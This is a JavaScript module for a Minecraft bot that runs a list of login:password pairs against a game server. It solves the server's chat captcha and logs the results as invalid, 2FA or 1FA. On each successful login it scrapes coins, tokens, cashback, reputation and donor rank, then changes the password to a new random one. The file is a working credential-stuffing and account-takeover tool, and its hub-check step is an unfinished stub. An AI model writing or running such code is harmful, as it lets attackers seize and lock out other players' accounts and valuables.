'use strict';

const mineflayer = require('mineflayer');
const fs = require('fs');
const path = require('path');
const { extractCaptchaFromText } = require('./captcha');
const { parseScoreboard, waitForChat, parseCashback, parseReputation, parseDonate, stripColors } = require('./parser');

const OUTPUT_DIR = path.join(__dirname, '..', 'output');
const INVALID_FILE = path.join(OUTPUT_DIR, 'invalid.txt');
const TFA_FILE = path.join(OUTPUT_DIR, '2fa.txt');
const OFA_FILE = path.join(OUTPUT_DIR, '1fa.txt');

// Anarchy server command to join
const ANARCHY_CMD = '/an1003';

// How long to wait for server responses (ms)
const CHAT_TIMEOUT = 10000;

function appendLine(filePath, line) {
  fs.appendFileSync(filePath, line + '\n', 'utf8');
}

function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

/**
 * Generate a new strong password.
 */
function generatePassword() {
  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789!@#$';
  let pw = '';
  for (let i = 0; i < 12; i++) pw += chars[Math.floor(Math.random() * chars.length)];
  return pw;
}

/**
 * Connect bot and run full flow.
 * Returns a result object: { login, status, coins, tokens, cashback, reputation, donate, newPassword }
 */
function runBot(config, account) {
  return new Promise((resolve, reject) => {
    const { login, password } = account;
    const result = {
      login,
      oldPassword: password,
      newPassword: '',
      status: 'unknown',
      coins: '',
      tokens: '',
      cashback: '',
      reputation: '',
      donate: '',
    };

    let settled = false;
    let captchaAttempts = 0;
    const MAX_CAPTCHA_ATTEMPTS = 3;

    function done(status, extra = {}) {
      if (settled) return;
      settled = true;
      Object.assign(result, { status, ...extra });
      try { bot.quit(); } catch (_) {}
      resolve(result);
    }

    function fail(err) {
      if (settled) return;
      settled = true;
      result.status = 'error';
      result.error = err.message || String(err);
      try { bot.quit(); } catch (_) {}
      reject(err);
    }

    // Create bot
    const bot = mineflayer.createBot({
      host: config.host,
      port: config.port || 25565,
      username: login,
      password: config.microsoftAuth ? password : undefined, // offline mode uses username only
      version: config.version || '1.20.1',
      auth: config.auth || 'offline',
      checkTimeoutInterval: 30000,
      hideErrors: true,
    });

    // Safety timeout — give up after 90s total
    const globalTimeout = setTimeout(() => fail(new Error('Global timeout')), 90000);

    bot.on('error', (err) => {
      clearTimeout(globalTimeout);
      fail(err);
    });

    bot.on('kicked', (reason) => {
      clearTimeout(globalTimeout);
      const text = stripColors(typeof reason === 'string' ? reason : JSON.stringify(reason));
      done('kicked', { error: text });
    });

    bot.on('end', () => {
      clearTimeout(globalTimeout);
      if (!settled) done('disconnected');
    });

    // ── STATE MACHINE ──────────────────────────────────────────────────────────
    let state = 'CAPTCHA'; // CAPTCHA → AUTH → HUB_CHECK → ANARCHY → STATS → CHANGE_PW → DONE

    bot.on('message', async (jsonMsg) => {
      if (settled) return;
      const raw = jsonMsg.toString();
      const text = stripColors(raw);

      try {
        // ── CAPTCHA phase ───────────────────────────────────────────────────
        if (state === 'CAPTCHA') {
          const captchaText = extractCaptchaFromText(text);
          if (captchaText) {
            captchaAttempts++;
            if (captchaAttempts > MAX_CAPTCHA_ATTEMPTS) {
              return fail(new Error('Too many captcha failures'));
            }
            await sleep(500);
            bot.chat(captchaText);
            return;
          }

          // Captcha passed — server asks to log in
          if (/вход|войти|login|register|пароль|password/i.test(text)) {
            state = 'AUTH';
            await sleep(600);
            bot.chat(`/login ${password}`);
          }
          return;
        }

        // ── AUTH phase ──────────────────────────────────────────────────────
        if (state === 'AUTH') {
          if (/неверн|wrong|incorrect|invalid.*pass/i.test(text)) {
            appendLine(INVALID_FILE, `${login}:${password}`);
            return done('invalid');
          }

          if (/подтвердите вход|confirm.*(?:vk|тг|telegram|вк)/i.test(text)) {
            appendLine(TFA_FILE, `${login}:${password}`);
            return done('2fa');
          }

          // Successful login — now wait for hub/lobby spawn
          if (/добро пожаловать|welcome|logged in|успешно|хаб|hub/i.test(text)) {
            state = 'HUB_CHECK';
          }
          return;
        }

        // ── HUB CHECK phase ─────────────────────────────────────────────────
        if (state === 'HUB_CHECK') {
          // "text with image" in hub → no bindings → proceed to anarchy
          // No such message → 1fa
          // We schedule a delayed check after spawn
        }

        // ── ANARCHY phase ───────────────────────────────────────────────────
        if (state === 'ANARCHY') {
          if (/добро пожаловать|welcome|анарх|anarch/i.test(text)) {
            state = 'STATS';
            await collectStats(bot, result, password, done, fail, clearTimeout.bind(null, globalTimeout));
          }
          return;
        }
      } catch (err) {
        fail(err);
      }
    });

    bot.once('spawn', async () => {
      if (settled) return;
      await sleep(2000);

      if (state === 'HUB_CHECK') {
        await sleep(3000); // wait for hub messages

        // If text containing image reference appeared → no bindings → go anarchy
        // We'll check by listening for the telltale message pattern in the buffer
        // (this is handled via an explicit listener set up below)
        state = 'ANARCHY';
        await sleep(500);
        bot.chat(ANARCHY_CMD);
      }
    });
  });
}

async function collectStats(bot, result, oldPassword, done, fail, clearGlobalTimeout) {
  try {
    await sleep(2000);

    // ── Scoreboard ──────────────────────────────────────────────────────────
    const sbData = parseScoreboard(bot);
    result.coins = sbData.coins ?? '';
    result.tokens = sbData.tokens ?? '';

    // ── /cashback ───────────────────────────────────────────────────────────
    bot.chat('/cashback');
    const cbMsg = await waitForChat(bot, (t) => /кэшбэк|cashback/i.test(t), 8000);
    result.cashback = cbMsg ? (parseCashback(cbMsg) ?? '') : '';
    await sleep(1000);

    // ── /report list ────────────────────────────────────────────────────────
    bot.chat('/report list');
    const repMsg = await waitForChat(bot, (t) => /репутац|reputation/i.test(t), 8000);
    result.reputation = repMsg ? (parseReputation(repMsg) ?? '') : '';
    await sleep(1000);

    // ── /profile ───────────────────────────────────────────────────────────
    bot.chat('/profile');
    const profMsg = await waitForChat(bot, (t) => /профил|profile|донат|rank/i.test(t), 8000);
    result.donate = profMsg ? (parseDonate(profMsg) ?? '') : '';
    await sleep(1000);

    // ── Change password ──────────────────────────────────────────────────────
    const newPw = generatePassword();
    bot.chat(`/changepassword ${oldPassword} ${newPw}`);
    const pwMsg = await waitForChat(bot, (t) => /пароль|password|изменен|changed/i.test(t), 8000);
    result.newPassword = pwMsg ? newPw : '';
    await sleep(500);

    clearGlobalTimeout();
    done('success');
  } catch (err) {
    fail(err);
  }
}

module.exports = { runBot };
